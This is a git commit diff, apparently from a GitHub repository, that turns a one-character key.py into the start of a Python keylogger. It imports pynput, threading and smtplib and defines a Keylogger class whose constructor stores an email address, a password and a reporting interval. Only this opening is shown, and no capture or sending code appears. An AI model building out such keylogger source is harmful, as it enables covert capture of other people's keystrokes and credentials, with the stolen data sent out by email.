5a6da60f0ababef18f8f3668204019c9b72d6a3f
Sam <99977535+shemkumar@users.noreply.github.com>
2023-10-27 22:57:30 +0530

    Update key.py

--- key.py
+++ key.py
@@ -1,1 +1,11 @@
-v
+from pynput import keyboard
+import threading
+import smtplib
+
+
+class Keylogger:
+    def __init__(self, time, email, password):
+        self.log = "[+] Keylogger has started"
+        self.time_interval = time
+        self.email = email
+        self.password = password
